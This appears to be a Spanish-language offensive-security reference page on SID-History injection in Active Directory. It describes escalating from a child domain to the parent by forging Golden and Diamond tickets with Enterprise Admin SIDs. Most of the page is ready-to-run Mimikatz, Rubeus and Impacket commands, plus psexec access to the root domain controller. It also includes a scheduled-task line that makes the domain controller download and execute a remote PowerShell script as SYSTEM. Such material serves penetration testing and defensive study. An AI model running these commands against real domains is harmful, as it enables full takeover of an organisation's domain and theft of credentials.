# Inyección de SID-History

{{#include ../../banners/hacktricks-training.md}}

## Ataque de Inyección de SID History

El enfoque del **Ataque de Inyección de SID History** es ayudar en la **migración de usuarios entre dominios** mientras se asegura el acceso continuo a los recursos del dominio anterior. Esto se logra **incorporando el Identificador de Seguridad (SID) anterior del usuario en el SID History** de su nueva cuenta. Notablemente, este proceso puede ser manipulado para otorgar acceso no autorizado al agregar el SID de un grupo de alto privilegio (como Administradores de Empresa o Administradores de Dominio) del dominio padre al SID History. Esta explotación confiere acceso a todos los recursos dentro del dominio padre.

Existen dos métodos para ejecutar este ataque: a través de la creación de un **Golden Ticket** o un **Diamond Ticket**.

Para identificar el SID del grupo **"Administradores de Empresa"**, primero se debe localizar el SID del dominio raíz. Tras la identificación, el SID del grupo de Administradores de Empresa se puede construir agregando `-519` al SID del dominio raíz. Por ejemplo, si el SID del dominio raíz es `S-1-5-21-280534878-1496970234-700767426`, el SID resultante para el grupo "Administradores de Empresa" sería `S-1-5-21-280534878-1496970234-700767426-519`.

También se podría usar el SID de los grupos **Administradores de Dominio**, que termina en **512**.

Otra forma de encontrar el SID de un grupo del otro dominio (por ejemplo "Administradores de Dominio") es con:
```powershell
Get-DomainGroup -Identity "Domain Admins" -Domain parent.io -Properties ObjectSid
```
### Golden Ticket (Mimikatz) con KRBTGT-AES256
```bash
mimikatz.exe "kerberos::golden /user:Administrator /domain:<current_domain> /sid:<current_domain_sid> /sids:<victim_domain_sid_of_group> /aes256:<krbtgt_aes256> /startoffset:-10 /endin:600 /renewmax:10080 /ticket:ticket.kirbi" "exit"

/user is the username to impersonate (could be anything)
/domain is the current domain.
/sid is the current domain SID.
/sids is the SID of the target group to add ourselves to.
/aes256 is the AES256 key of the current domain's krbtgt account.
--> You could also use /krbtgt:<HTML of krbtgt> instead of the "/aes256" option
/startoffset sets the start time of the ticket to 10 mins before the current time.
/endin sets the expiry date for the ticket to 60 mins.
/renewmax sets how long the ticket can be valid for if renewed.

# The previous command will generate a file called ticket.kirbi
# Just loading you can perform a dcsync attack agains the domain
```
Para más información sobre los tickets dorados, consulta:

{{#ref}}
golden-ticket.md
{{#endref}}

### Ticket Diamante (Rubeus + KRBTGT-AES256)
```powershell
# Use the /sids param
Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:512 /sids:S-1-5-21-378720957-2217973887-3501892633-512 /krbkey:390b2fdb13cc820d73ecf2dadddd4c9d76425d4c2156b89ac551efb9d591a8aa /nowrap

# Or a ptt with a golden ticket
Rubeus.exe golden /rc4:<krbtgt hash> /domain:<child_domain> /sid:<child_domain_sid>  /sids:<parent_domain_sid>-519 /user:Administrator /ptt

# You can use "Administrator" as username or any other string
```
Para más información sobre los tickets de diamante, consulta:

{{#ref}}
diamond-ticket.md
{{#endref}}
```bash
.\asktgs.exe C:\AD\Tools\kekeo_old\trust_tkt.kirbi CIFS/mcorp-dc.moneycorp.local
.\kirbikator.exe lsa .\CIFS.mcorpdc.moneycorp.local.kirbi
ls \\mcorp-dc.moneycorp.local\c$
```
Escalar a DA de root o administrador de Enterprise utilizando el hash KRBTGT del dominio comprometido:
```bash
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-211874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234700767426-519 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /ticket:C:\AD\Tools\krbtgt_tkt.kirbi"'

Invoke-Mimikatz -Command '"kerberos::ptt C:\AD\Tools\krbtgt_tkt.kirbi"'

gwmi -class win32_operatingsystem -ComputerName mcorpdc.moneycorp.local

schtasks /create /S mcorp-dc.moneycorp.local /SC Weekely /RU "NT Authority\SYSTEM" /TN "STCheck114" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"

schtasks /Run /S mcorp-dc.moneycorp.local /TN "STCheck114"
```
Con los permisos adquiridos del ataque, puedes ejecutar, por ejemplo, un ataque DCSync en el nuevo dominio:

{{#ref}}
dcsync.md
{{#endref}}

### Desde linux

#### Manual con [ticketer.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py)
```bash
# This is for an attack from child to root domain
# Get child domain SID
lookupsid.py <child_domain>/username@10.10.10.10 | grep "Domain SID"
# Get root domain SID
lookupsid.py <child_domain>/username@10.10.10.10 | grep -B20 "Enterprise Admins" | grep "Domain SID"

# Generate golden ticket
ticketer.py -nthash <krbtgt_hash> -domain <child_domain> -domain-sid <child_domain_sid> -extra-sid <root_domain_sid> Administrator

# NOTE THAT THE USERNAME ADMINISTRATOR COULD BE ACTUALLY ANYTHING
# JUST USE THE SAME USERNAME IN THE NEXT STEPS

# Load ticket
export KRB5CCNAME=hacker.ccache

# psexec in domain controller of root
psexec.py <child_domain>/Administrator@dc.root.local -k -no-pass -target-ip 10.10.10.10
```
#### Automático usando [raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py)

Este es un script de Impacket que **automatiza la escalada de un dominio hijo a un dominio padre**. El script necesita:

- Controlador de dominio objetivo
- Credenciales para un usuario administrador en el dominio hijo

El flujo es:

- Obtiene el SID del grupo de Administradores de la Empresa del dominio padre
- Recupera el hash de la cuenta KRBTGT en el dominio hijo
- Crea un Golden Ticket
- Inicia sesión en el dominio padre
- Recupera credenciales para la cuenta de Administrador en el dominio padre
- Si se especifica el interruptor `target-exec`, se autentica en el Controlador de Dominio del dominio padre a través de Psexec.
```bash
raiseChild.py -target-exec 10.10.10.10 <child_domain>/username
```
## Referencias

- [https://adsecurity.org/?p=1772](https://adsecurity.org/?p=1772)
- [https://www.sentinelone.com/blog/windows-sid-history-injection-exposure-blog/](https://www.sentinelone.com/blog/windows-sid-history-injection-exposure-blog/)

{{#include ../../banners/hacktricks-training.md}}
